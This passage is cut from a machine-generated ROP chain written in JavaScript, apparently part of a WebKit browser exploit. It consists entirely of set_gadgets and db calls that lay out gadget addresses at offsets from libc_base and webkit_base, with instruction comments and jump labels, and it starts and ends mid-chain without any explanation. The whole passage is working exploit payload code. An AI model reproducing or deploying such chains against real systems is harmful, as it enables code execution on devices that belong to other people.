db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+8824269, //setle al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+133744, //L1787
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133760, //L1788
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+133728, //L1786
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1786:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1787:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1788:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+133864, //L1790
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+133928, //L1794
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+133896, //L1792
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1790:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1791:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1792:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1793:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1794:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+134040, //L1795+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+134032, //L1795
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L1795:
db([0, 0]); // 0x0
set_gadgets([
ropchain+134056, //L1795+24
ropchain+135688, //L1789
libc_base+793877, //pop rsi
ropchain+134112, //L1798
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1797:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1798:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+134200, //L1799
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+134216, //L1801
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1799:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1801:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+134368, //L1803
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+134400, //L1805
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+134352, //L1802
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+134384, //L1804
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1802:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1803:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1804:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1805:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+134472, //L1806
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+134488, //L1807
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1806:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1807:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+134648, //L1811
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+134600, //L1808
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+134616, //L1809
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1808:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1809:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1810:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L1811:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+134704, //L1813
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L1813:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+134808, //L1814
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+134840, //L1816
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+134824, //L1815
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1814:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1815:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1816:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+134912, //L1817
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+134928, //L1818
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1817:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1818:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+135024, //L1820
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+135008, //L1819
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1819:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1820:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+135104, //L1821
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1821:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1822:
db([10, 0]); // 0xa
set_gadget(libc_base+206806,); //pop rdi
//L1823:
db([10, 0]); // 0xa
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+135256, //L1825
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135272, //L1826
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+135240, //L1824
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1824:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1825:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1826:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+135440, //L1828
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135456, //L1829
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+135424, //L1827
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1827:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1828:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1829:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+135560, //L1830
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135608, //L1833
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+135576, //L1831
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1830:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1831:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1832:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1833:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+135680, //L1835
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1835:
db([0, 0]); // 0x0
//L1789:
set_gadgets([
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+135800, //L1837
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135816, //L1838
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+135784, //L1836
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1836:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1837:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1838:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+135920, //L1839
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+135968, //L1842
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+135936, //L1840
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1839:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1840:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1841:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1842:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+389047, //setne al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+136040, //L1844
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1844:
db([0, 0]); // 0x0
//L1736:
set_gadgets([
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+136160, //L1846
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+136176, //L1847
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+136144, //L1845
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1845:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1846:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1847:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+136280, //L1849
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+136328, //L1852
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+136296, //L1850
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1849:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1850:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1851:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1852:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+136440, //L1853+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+136432, //L1853
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L1853:
db([0, 0]); // 0x0
set_gadgets([
ropchain+136456, //L1853+24
ropchain+138752, //L1848
libc_base+793877, //pop rsi
ropchain+136512, //L1856
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1855:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1856:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+136600, //L1857
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+136616, //L1859
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1857:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1859:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+136768, //L1861
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+136800, //L1863
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+136752, //L1860
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+136784, //L1862
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1860:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1861:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1862:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1863:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+136872, //L1864
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+136888, //L1865
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1864:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1865:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+137048, //L1869
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+137000, //L1866
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+137016, //L1867
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1866:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1867:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1868:
db([56, 0]); // 0x38
set_gadget(libc_base+788575,); //pop rax
//L1869:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+137152, //L1871
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+137136, //L1870
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1870:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1871:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+137248, //L1874
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1873:
db([24, 0]); // 0x18
set_gadget(libc_base+792472,); //pop rcx
//L1874:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+137336, //L1875
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+137352, //L1877
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1875:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1877:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+137424, //L1878
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+137440, //L1879
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1878:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1879:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+137584, //L1882
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+137552, //L1880
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+137568, //L1881
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1880:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1881:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1882:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+137672, //L1884
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L1883:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L1884:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+137776, //L1887
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1886:
db([24, 0]); // 0x18
set_gadget(libc_base+792472,); //pop rcx
//L1887:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+137864, //L1888
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+137880, //L1890
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1888:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1890:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+137968, //L1891
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+137984, //L1893
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
//L1891:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1893:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+138040, //L1895
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1895:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+138160, //L1896
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1896:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+138216, //L1899
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1899:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+138360, //L1902
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+138328, //L1900
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1900:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1901:
db([56, 0]); // 0x38
set_gadget(libc_base+788575,); //pop rax
//L1902:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+138488, //L1904
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+138504, //L1905
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+138472, //L1903
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1903:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1904:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1905:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+138600, //L1906
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+138616, //L1907
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1906:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1907:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+138728, //L1908
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+138712, //L1909
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1909:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1908:
db([0, 0]); // 0x0
set_gadgets([
libc_base+811575, //pop rsp
ropchain+140160, //L1910
//L1848:
libc_base+793877, //pop rsi
ropchain+138808, //L1913
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1912:
db([24, 0]); // 0x18
set_gadget(libc_base+792472,); //pop rcx
//L1913:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+138896, //L1914
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+138912, //L1916
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1914:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1916:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+139056, //L1919
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+139024, //L1917
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+139040, //L1918
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1917:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1918:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1919:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+139152, //L1922
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1921:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1922:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+139240, //L1923
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+139256, //L1925
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1923:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1925:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+139408, //L1927
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+139440, //L1929
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+139392, //L1926
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+139424, //L1928
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1926:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1927:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1928:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1929:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+139536, //L1931
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+139520, //L1930
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1930:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1931:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L1933:
ropchain+139640, //L1932
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+140472, //L1934
//L1932:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+139776, //L1936
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+139792, //L1937
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+139760, //L1935
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1935:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1936:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1937:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+139912, //L1939
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+139928, //L1940
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
